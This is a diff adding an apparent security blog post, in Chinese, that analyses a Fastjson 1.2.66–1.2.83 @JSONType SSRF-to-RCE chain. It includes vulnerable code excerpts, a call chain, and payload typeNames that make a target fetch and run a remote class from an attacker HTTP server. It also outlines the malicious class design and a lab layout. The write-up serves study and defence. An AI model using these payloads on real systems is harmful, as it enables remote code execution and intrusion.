@@ -1,0 +1,536 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记 | Timind's café</title><meta name="author" content="Timind"><meta name="copyright" content="Timind"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记 复现环境：JDK 8u202 + fastjson 1.2.83 + Spring Boot Loader 2.7.18复现日期：2026-07-21   一、漏洞背景1.1 历史脉络fastjson 从 1.2.24 开始频繁爆出反序列化 RCE，官方逐步引入：    版本 防御措施    1.2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记">
+<meta property="og:url" content="http://timind-sec.github.io/posts/fastjson%E6%97%A0gadget%E7%BB%95%E8%BF%87RCE/index.html">
+<meta property="og:site_name" content="Timind&#39;s café">
+<meta property="og:description" content="Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记 复现环境：JDK 8u202 + fastjson 1.2.83 + Spring Boot Loader 2.7.18复现日期：2026-07-21   一、漏洞背景1.1 历史脉络fastjson 从 1.2.24 开始频繁爆出反序列化 RCE，官方逐步引入：    版本 防御措施    1.2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://timind-sec.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-07-21T14:31:00.000Z">
+<meta property="article:modified_time" content="2026-08-13T21:51:03.822Z">
+<meta property="article:author" content="Timind">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://timind-sec.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记",
+  "url": "http://timind-sec.github.io/posts/fastjson%E6%97%A0gadget%E7%BB%95%E8%BF%87RCE/",
+  "image": "http://timind-sec.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-07-21T14:31:00.000Z",
+  "dateModified": "2026-08-13T21:51:03.822Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Timind",
+      "url": "http://timind-sec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://timind-sec.github.io/posts/fastjson%E6%97%A0gadget%E7%BB%95%E8%BF%87RCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/url(https:/c-ssl.duitang.com/uploads/item/201902/27/20190227220253_hhrtf.jpg));"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Timind's café</span></a><a class="nav-page-title" href="/"><span class="site-name">Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-21T14:31:00.000Z" title="发表于 2026-07-21 22:31:00">2026-07-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-13T21:51:03.822Z" title="更新于 2026-08-14 05:51:03">2026-08-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Fastjson-1-2-66–1-2-83-JsonType-SSRF-→-RCE-漏洞学习笔记"><a href="#Fastjson-1-2-66–1-2-83-JsonType-SSRF-→-RCE-漏洞学习笔记" class="headerlink" title="Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记"></a>Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记</h1><blockquote>
+<p>复现环境：JDK 8u202 + fastjson 1.2.83 + Spring Boot Loader 2.7.18<br>复现日期：2026-07-21</p>
+</blockquote>
+<hr>
+<h2 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h2><h3 id="1-1-历史脉络"><a href="#1-1-历史脉络" class="headerlink" title="1.1 历史脉络"></a>1.1 历史脉络</h3><p>fastjson 从 1.2.24 开始频繁爆出反序列化 RCE，官方逐步引入：</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>防御措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.25</td>
+<td>引入 <code>AutoTypeSupport</code>（默认关闭）+ 黑名单</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>黑名单改为哈希，增加 <code>expectClass</code> 校验</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td><strong>引入 <code>@JSONType</code> 注解资源探测</strong>——如果字节码含此注解，视为可信类型</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>引入 <code>safeMode</code>（默认关闭），开启后完全禁用 AutoType</td>
+</tr>
+</tbody></table>
+<p><strong>本次漏洞的时间线：</strong></p>
+<ul>
+<li>1.2.66 引入了 <code>@JSONType</code> 资源探测逻辑，初衷是在 AutoType 关闭时仍能”信任”带注解的内部类型</li>
+<li>该逻辑在 <strong>1.2.66 – 1.2.83</strong> 间一直存在</li>
+<li>2025 年安全研究者发现：如果目标 ClassLoader 能解析 <code>jar:http:</code> URL，这个”信任机制”就会变成一个完整的 SSRF → RCE 利用链</li>
+<li><strong>1.2.84+</strong> 修复了此问题</li>
+</ul>
+<h3 id="1-2-影响范围"><a href="#1-2-影响范围" class="headerlink" title="1.2 影响范围"></a>1.2 影响范围</h3><table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>fastjson</td>
+<td>1.2.66 – 1.2.83</td>
+</tr>
+<tr>
+<td>ClassLoader</td>
+<td>Spring Boot FatJar 的 <code>LaunchedURLClassLoader</code>，或任何能解析 <code>jar:http:</code> URL 的 ClassLoader</td>
+</tr>
+<tr>
+<td>JDK</td>
+<td><strong>完整 RCE 需 JDK 8</strong>；JDK 9+ 仅能 SSRF（<code>ClassFormatError</code> 阻断 <code>defineClass</code>）</td>
+</tr>
+<tr>
+<td>AutoType</td>
+<td><strong>关闭亦可</strong>——攻击走 <code>@JSONType</code> 信任分支</td>
+</tr>
+<tr>
+<td>SafeMode</td>
+<td>若开启（<code>-Dfastjson.parser.safeMode=true</code>）则完全免疫</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-与历史漏洞的本质区别"><a href="#1-3-与历史漏洞的本质区别" class="headerlink" title="1.3 与历史漏洞的本质区别"></a>1.3 与历史漏洞的本质区别</h3><table>
+<thead>
+<tr>
+<th></th>
+<th>历史链（JdbcRowSetImpl 等）</th>
+<th>本链（JsonType）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>入口</td>
+<td><code>@type</code> + 黑名单绕过</td>
+<td><code>@type</code> 被拼成 <strong>资源 URL</strong></td>
+</tr>
+<tr>
+<td>依赖 gadget</td>
+<td><code>JdbcRowSetImpl</code> &#x2F; <code>TemplatesImpl</code> 等</td>
+<td><strong>无经典 gadget</strong></td>
+</tr>
+<tr>
+<td>执行点</td>
+<td>反序列化 setter &#x2F; JNDI 回调</td>
+<td>**远程类 <code>&lt;clinit&gt;</code>**（parse 阶段自动执行）</td>
+</tr>
+<tr>
+<td>防护绕过</td>
+<td>绕过黑名单</td>
+<td>绕过 AutoType（<code>@JSONType</code> 信任分支）</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="二、参考链接"><a href="#二、参考链接" class="headerlink" title="二、参考链接"></a>二、参考链接</h2><ul>
+<li>上游研究仓库：<a target="_blank" rel="noopener" href="https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC">https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC</a></li>
+<li>fastjson 官方：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></li>
+<li>Spring Boot Loader 文档：<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/2.7.x/reference/html/executable-jar.html">https://docs.spring.io/spring-boot/docs/2.7.x/reference/html/executable-jar.html</a></li>
+<li>ASM 框架：<a target="_blank" rel="noopener" href="https://asm.ow2.io/">https://asm.ow2.io/</a></li>
+</ul>
+<hr>
+<h2 id="三、漏洞函数位置"><a href="#三、漏洞函数位置" class="headerlink" title="三、漏洞函数位置"></a>三、漏洞函数位置</h2><h3 id="3-1-核心漏洞函数"><a href="#3-1-核心漏洞函数" class="headerlink" title="3.1 核心漏洞函数"></a>3.1 核心漏洞函数</h3><p><strong>文件：</strong> <code>com/alibaba/fastjson/parser/ParserConfig.java</code></p>
+<p><strong>函数：</strong> <code>checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features)</code></p>
+<p>关键代码段（基于 1.2.83 字节码逆向 + 动态调试还原）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ParserConfig.checkAutoType() — 简化版本</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [1] 黑名单/白名单检查</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [2] ★★★ 资源探测 — SSRF 触发点 ★★★</span></span><br><span class="line">    <span class="comment">// 即使 AutoType=false，以下代码仍会执行！</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> classLoader.getResourceAsStream(resource);  <span class="comment">// ← SSRF 在此触发</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// [3] ★ 用 ASM 扫描字节码是否含 @JSONType ★</span></span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(...);</span><br><span class="line">        reader.accept(visitor, ...);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [4] 如果扫描到 @JSONType → 走信任分支</span></span><br><span class="line">        <span class="keyword">if</span> (hasJSONTypeAnnotation(visitor)) &#123;</span><br><span class="line">            <span class="comment">// ★★★ 绕过 AutoType 检查！★★★</span></span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, classLoader, cacheClass); <span class="comment">// ← defineClass</span></span><br><span class="line">            <span class="comment">// 将 typeName 加入内部白名单</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [5] 正常走到这里才被 AutoType=false 拦截</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>调用链：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JSON<span class="selector-class">.parse</span>(payload)</span><br><span class="line">  → DefaultJSONParser<span class="selector-class">.parse</span>()</span><br><span class="line">    → DefaultJSONParser<span class="selector-class">.parseObject</span>(<span class="selector-tag">input</span>, null)</span><br><span class="line">      → ParserConfig<span class="selector-class">.checkAutoType</span>(typeName, ...)   <span class="comment">// ← 漏洞函数</span></span><br><span class="line">        → classLoader<span class="selector-class">.getResourceAsStream</span>(resource)  <span class="comment">// ← SSRF</span></span><br><span class="line">        → ASM ClassReader 扫描 @JSONType              <span class="comment">// ← 注解检测</span></span><br><span class="line">        → TypeUtils<span class="selector-class">.loadClass</span>(typeName, ...)          <span class="comment">// ← defineClass + &lt;clinit&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-辅助函数"><a href="#3-2-辅助函数" class="headerlink" title="3.2 辅助函数"></a>3.2 辅助函数</h3><p><strong>文件：</strong> <code>com/alibaba/fastjson/util/TypeUtils.java</code></p>
+<p><strong>函数：</strong> <code>loadClass(String className, ClassLoader classLoader, boolean cacheClass)</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cacheClass) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = classLoader.loadClass(className);  <span class="comment">// ← LaunchedURLClassLoader.loadClass()</span></span><br><span class="line">        <span class="comment">// → findClass() → defineClass() → &lt;clinit&gt; 执行！</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-Spring-Boot-侧"><a href="#3-3-Spring-Boot-侧" class="headerlink" title="3.3 Spring Boot 侧"></a>3.3 Spring Boot 侧</h3><p><strong>文件：</strong> <code>org/springframework/boot/loader/LaunchedURLClassLoader.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LaunchedURLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 将 jar:http://... 解析为嵌套 jar URL</span></span><br><span class="line">        <span class="comment">// → 发起 HTTP GET 拉取远程 jar</span></span><br><span class="line">        <span class="comment">// → defineClass(name, bytes, 0, len)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、漏洞攻击原理"><a href="#四、漏洞攻击原理" class="headerlink" title="四、漏洞攻击原理"></a>四、漏洞攻击原理</h2><h3 id="4-1-整体攻击链"><a href="#4-1-整体攻击链" class="headerlink" title="4.1 整体攻击链"></a>4.1 整体攻击链</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────────────────────────────────────────────────┐</span><br><span class="line">│                     一次 POST 请求完成攻击                      │</span><br><span class="line">├──────────────────────────────────────────────────────────────┤</span><br><span class="line">│                                                               │</span><br><span class="line">│ ① payload: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;jar:http:..localhost:18080.probe!.POC&quot;</span>&#125;  │</span><br><span class="line">│                                                               │</span><br><span class="line">│ ② checkAutoType:                                              │</span><br><span class="line">│    typeName<span class="selector-class">.replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>                        │</span><br><span class="line">│    = <span class="string">&quot;jar:http://localhost:18080/probe!/POC.class&quot;</span>             │</span><br><span class="line">│                                                               │</span><br><span class="line">│ ③ classLoader<span class="selector-class">.getResourceAsStream</span>(↑)                           │</span><br><span class="line">│    LaunchedURLClassLoader 发起 HTTP GET → SSRF 拉取远程 jar   │</span><br><span class="line">│                                                               │</span><br><span class="line">│ ④ ASM ClassReader 扫描字节码                                   │</span><br><span class="line">│    发现 @com/alibaba/fastjson/annotation/JSONType              │</span><br><span class="line">│    → 走信任分支，绕过 AutoType 检查                             │</span><br><span class="line">│                                                               │</span><br><span class="line">│ ⑤ TypeUtils<span class="selector-class">.loadClass</span>(typeName, classLoader)                  │</span><br><span class="line">│    → classLoader<span class="selector-class">.loadClass</span>()                                   │</span><br><span class="line">│    → <span class="built_in">defineClass</span>()                                             │</span><br><span class="line">│    → &lt;clinit&gt; 自动执行  ← RCE！                                │</span><br><span class="line">│                                                               │</span><br><span class="line">└──────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-Payload-构造原理"><a href="#4-2-Payload-构造原理" class="headerlink" title="4.2 Payload 构造原理"></a>4.2 Payload 构造原理</h3><p>typeName 必须满足：经过 <code>replace(&#39;.&#39;,&#39;/&#39;)</code> 后变成一个合法的 <code>jar:http</code> URL。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typeName:     jar<span class="function">:http</span>:  <span class="string">..</span>  localhost<span class="function">:18080</span>  <span class="string">.probe</span>!  <span class="string">.POC</span></span><br><span class="line">                  ↓       ↓         ↓            ↓       ↓</span><br><span class="line">replace:        不变     <span class="string">//</span>   localhost<span class="function">:18080</span>  <span class="string">/probe</span>!  <span class="string">/POC</span></span><br><span class="line"><span class="params">(无点→不变)</span>     <span class="params">(2点→2杠)</span>   <span class="params">(无点→不变)</span>    <span class="params">(点→杠)</span>  <span class="params">(点→杠)</span></span><br><span class="line"></span><br><span class="line">最终: jar<span class="function">:http</span>:<span class="string">//localhost</span><span class="function">:18080</span>/probe!<span class="string">/POC.class</span></span><br><span class="line">      └─ jar URL ─┘└── 远端地址 ──┘└ jar内条目 ┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>两个 Payload 变体：</strong></p>
+<table>
+<thead>
+<tr>
+<th>变体</th>
+<th>typeName</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>localhost</td>
+<td><code>jar:http:..localhost:18080.probe!.POC</code></td>
+<td>localhost 无点，不被替换</td>
+</tr>
+<tr>
+<td>整数 IP</td>
+<td><code>jar:http:..2130706433:18080.probe!.POC</code></td>
+<td><code>2130706433</code> &#x3D; <code>127.0.0.1</code> 的整数形式，无点不受影响</td>
+</tr>
+</tbody></table>
+<h3 id="4-3-恶意字节码设计（CraftProbe-GenExec）"><a href="#4-3-恶意字节码设计（CraftProbe-GenExec）" class="headerlink" title="4.3 恶意字节码设计（CraftProbe &#x2F; GenExec）"></a>4.3 恶意字节码设计（CraftProbe &#x2F; GenExec）</h3><p>ASM 生成的特殊 class 文件必须同时满足三个条件：</p>
+<table>
+<thead>
+<tr>
+<th>设计点</th>
+<th>实现</th>
+<th>目的</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>① internal name &#x3D; jar:http URL</td>
+<td><code>ClassWriter.visit(..., &quot;jar:http://localhost:18080/probe!/POC&quot;, ...)</code></td>
+<td>使得 typeName → resource → URL 形成闭环</td>
+</tr>
+<tr>
+<td>② 带 <code>@JSONType</code> 注解</td>
+<td><code>visitor.visitAnnotation(&quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;, true)</code></td>
+<td>通过 checkAutoType 的信任检查</td>
+</tr>
+<tr>
+<td>③ 攻击载荷在 <code>&lt;clinit&gt;</code></td>
+<td><code>MethodVisitor.visitMethod(ACC_STATIC, &quot;&lt;clinit&gt;&quot;, ...)</code></td>
+<td>类加载时自动执行，无需业务代码二次触发</td>
+</tr>
+</tbody></table>
+<p><strong>为什么选 <code>&lt;clinit&gt;</code> 而非其他？</strong></p>
+<ul>
+<li><code>&lt;clinit&gt;</code>：类被 <code>defineClass</code> 时 <strong>JVM 自动执行</strong>，无需任何业务代码调用</li>
+<li><code>&lt;init&gt;</code>（构造函数）：需要 <code>new Foo()</code>，parse 阶段不保证调用</li>
+<li>普通方法 &#x2F; setter：不可控调用时机</li>
+</ul>
+<h3 id="4-4-fastjson-为什么内置-ASM？"><a href="#4-4-fastjson-为什么内置-ASM？" class="headerlink" title="4.4 fastjson 为什么内置 ASM？"></a>4.4 fastjson 为什么内置 ASM？</h3><p>fastjson 1.2.66+ 在自身 jar 内包含了一份 shaded ASM（<code>com.alibaba.fastjson.asm.*</code>），用于：</p>
+<ol>
+<li><strong>序列化优化</strong>：<code>ASMSerializerFactory</code> 动态生成序列化器字节码，提升性能</li>
+<li><strong><code>@JSONType</code> 扫描</strong>：<code>checkAutoType</code> 中通过 <code>ASMUtils</code> &#x2F; <code>ASMClassLoader</code> 检查字节码注解</li>
+</ol>
+<p>所以目标环境<strong>不需要</strong>额外引入 ASM——fastjson 自带的 ASM 就是 <code>@JSONType</code> 资源探测的引擎。</p>
+<hr>
+<h2 id="五、动态调试过程"><a href="#五、动态调试过程" class="headerlink" title="五、动态调试过程"></a>五、动态调试过程</h2><h3 id="5-1-环境准备"><a href="#5-1-环境准备" class="headerlink" title="5.1 环境准备"></a>5.1 环境准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目录结构</span></span><br><span class="line">2026FastjsonPoC-main/</span><br><span class="line">├── lib/</span><br><span class="line">│   ├── fastjson-1.2.83.jar          <span class="comment"># 漏洞库</span></span><br><span class="line">│   ├── spring-boot-loader-2.7.18.jar <span class="comment"># 提供 LaunchedURLClassLoader</span></span><br><span class="line">│   └── asm-9.6.jar                  <span class="comment"># 仅用于生成恶意字节码</span></span><br><span class="line">├── src/main/java/</span><br><span class="line">│   ├── CraftProbe.java              <span class="comment"># 核心：ASM 生成恶意类</span></span><br><span class="line">│   ├── Gen.java / GenExec.java      <span class="comment"># probe.jar 生成器入口</span></span><br><span class="line">│   ├── Test.java                    <span class="comment"># 基线：普通 ClassLoader（预期失败）</span></span><br><span class="line">│   ├── Test2.java                   <span class="comment"># 完整利用链 harness</span></span><br><span class="line">│   └── ProbeHttpd.java              <span class="comment"># 攻击者 HTTP 服务</span></span><br><span class="line">├── victim-app/</span><br><span class="line">│   ├── src/VictimServer.java        <span class="comment"># 受害网站</span></span><br><span class="line">│   ├── build.sh                     <span class="comment"># FatJar 构建脚本</span></span><br><span class="line">│   └── target/victim-app.jar        <span class="comment"># 构建产物</span></span><br><span class="line">└── probe_exec.jar                   <span class="comment"># 恶意 jar（攻击载荷）</span></span><br></pre></td></tr></table></figure>
+
